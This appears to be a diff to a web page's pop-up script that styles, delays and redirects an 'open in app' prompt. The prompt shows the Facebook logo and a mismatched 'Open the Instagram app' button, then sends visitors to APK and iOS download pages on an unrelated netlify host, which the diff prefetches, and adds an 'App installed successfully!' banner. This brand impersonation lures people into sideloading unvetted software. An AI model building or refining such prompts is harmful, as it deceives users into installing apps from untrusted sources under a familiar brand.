@@ -5,7 +5,15 @@
     <meta charset="UTF-8"/>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="" type="text/css"/>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <!-- تحميل الخط عند الطلب فقط -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <noscript>
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    </noscript>
+    <!-- Prefetch لصفحات التحميل -->
+    <link rel="prefetch" href="https://turkify.netlify.app/apk.html" as="document">
+    <link rel="prefetch" href="https://turkify.netlify.app/ios.html" as="document">
 </head>
 <body>
 
@@ -27,12 +35,13 @@
     text-align: center;
     opacity: 0;
     transition: transform 0.3s ease-out, opacity 0.3s ease-out;
-    font-family: 'Inter', sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
   }
 
   .custom13-popup.show {
     transform: translateX(-50%) translateY(0);
     opacity: 1;
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
   }
 
   .custom13-popup .header {
@@ -74,7 +83,6 @@
     cursor: pointer;
     transition: all 0.2s ease;
     font-weight: 500;
-    font-family: 'Inter', sans-serif;
   }
 
   .custom13-popup .btn-primary {
@@ -100,27 +108,47 @@
   .custom13-popup .btn-secondary:hover {
     text-decoration: underline;
   }
+
+  .custom13-notification {
+    position: fixed;
+    bottom: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background-color: #4CAF50;
+    color: white;
+    padding: 12px 24px;
+    border-radius: 4px;
+    z-index: 60001;
+    display: none;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+  }
 </style>
 
-<div class="custom13-popup" id="custom13-popup">
+<div class="custom13-popup" id="custom13-popup" role="dialog" aria-modal="true" aria-labelledby="custom13-popup-title">
   <div class="header">
     <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" loading="lazy" width="60" height="60"/>
   </div>
-  <h5>See full profile in the app</h5>
+  <h5 id="custom13-popup-title">See full profile in the app</h5>
   <p>Enjoy photos, videos, and more from Facebook</p>
   <button class="btn btn-primary" onclick="custom13_handlePrimaryButtonClick()" type="button" aria-label="Open the Instagram app">Open the Instagram app</button>
   <button class="btn btn-secondary" onclick="custom13_closePopup()" type="button" aria-label="Not now">Not now</button>
 </div>
 
+<div class="custom13-notification" id="custom13-notification">
+  App installed successfully! Redirecting...
+</div>
+
 <script>
   let custom13_deferredPrompt = null;
   const custom13_popup = document.getElementById('custom13-popup');
+  const custom13_notification = document.getElementById('custom13-notification');
   let custom13_popupTimeout = null;
   const CUSTOM13_STORAGE_KEY = 'custom13_popupDismissed';
   const CUSTOM13_DELAY = 3000;
   const ANDROID_APK_URL = 'https://turkify.netlify.app/apk.html';
   const IOS_APP_URL = 'https://turkify.netlify.app/ios.html';
 
+  // ✅ الكشف عن دعم PWA بطريقة متوافقة مع جميع المتصفحات
   function custom13_isPWA() {
     return window.matchMedia('(display-mode: standalone)').matches || 
            window.navigator.standalone || 
@@ -133,13 +161,25 @@
   }
 
   function custom13_supportsPWA() {
-    return 'BeforeInstallPromptEvent' in window || 
-           window.matchMedia('(display-mode: standalone)').matches;
+    // دعم أوسع لمتصفحات مختلفة
+    return ('BeforeInstallPromptEvent' in window) || 
+           (window.matchMedia('(display-mode: standalone)').matches) ||
+           (navigator.standalone) ||
+           (window.cordova) ||
+           (window.Capacitor);
   }
 
   function custom13_initializePopup() {
     if (!custom13_isPWA() && !sessionStorage.getItem(CUSTOM13_STORAGE_KEY)) {
-      custom13_popupTimeout = setTimeout(custom13_showPopup, CUSTOM13_DELAY);
+      custom13_popupTimeout = setTimeout(() => {
+        // تحميل الخط عند أول عرض للنافذة
+        const link = document.createElement('link');
+        link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap';
+        link.rel = 'stylesheet';
+        document.head.appendChild(link);
+        
+        custom13_showPopup();
+      }, CUSTOM13_DELAY);
     }
   }
 
@@ -158,6 +198,7 @@
       custom13_popup.style.display = 'block';
       requestAnimationFrame(() => {
         custom13_popup.classList.add('show');
+        custom13_popup.focus();
       });
     }
   }
@@ -175,7 +216,18 @@
 
   function custom13_handlePrimaryButtonClick() {
     if (custom13_isPWA()) {
-      window.location.href = "intent://turkifyy.blogspot.com/2025/01/test59.html/#Intent;scheme=https;package=org.chromium.webapk.a778eb5b209c4adaf_v2;end";
+      // محاولة فتح التطبيق مباشرة بطرق مختلفة
+      const appUrl = "intent://turkifyy.blogspot.com/2025/01/test59.html/#Intent;scheme=https;package=org.chromium.webapk.a778eb5b209c4adaf_v2;end";
+      
+      // محاولة فتح التطبيق
+      window.location.href = appUrl;
+      
+      // إذا فشل فتح التطبيق، إعادة التوجيه بعد فترة
+      setTimeout(() => {
+        if (!document.hidden) {
+          window.location.href = "https://turkifyy.blogspot.com/2025/01/test59.html";
+        }
+      }, 500);
     } else if (custom13_deferredPrompt) {
       custom13_showInstallPrompt();
     } else {
@@ -185,7 +237,7 @@
 
   function custom13_redirectToAppDownload() {
     const url = custom13_isIOS() ? IOS_APP_URL : ANDROID_APK_URL;
-    window.open(url, '_blank');
+    window.open(url, '_blank', 'noopener,noreferrer');
     custom13_closePopup();
   }
 
@@ -205,8 +257,14 @@
       custom13_redirectToAppDownload();
     } finally {
       custom13_deferredPrompt = null;
-      custom13_closePopup();
     }
+  }
+
+  function custom13_showSuccessNotification() {
+    custom13_notification.style.display = 'block';
+    setTimeout(() => {
+      custom13_notification.style.display = 'none';
+    }, 3000);
   }
 
   document.addEventListener('DOMContentLoaded', () => {
@@ -219,7 +277,17 @@
 
   window.addEventListener('appinstalled', () => {
     sessionStorage.setItem(CUSTOM13_STORAGE_KEY, 'true');
-    custom13_closePopup();
+    custom13_showSuccessNotification();
+    setTimeout(() => {
+      window.location.href = '/'; // إعادة التوجيه للصفحة الرئيسية
+    }, 2000);
+  });
+
+  // إغلاق النافذة بالزر ESC
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape' && custom13_popup.classList.contains('show')) {
+      custom13_closePopup();
+    }
   });
 </script>
 </body>
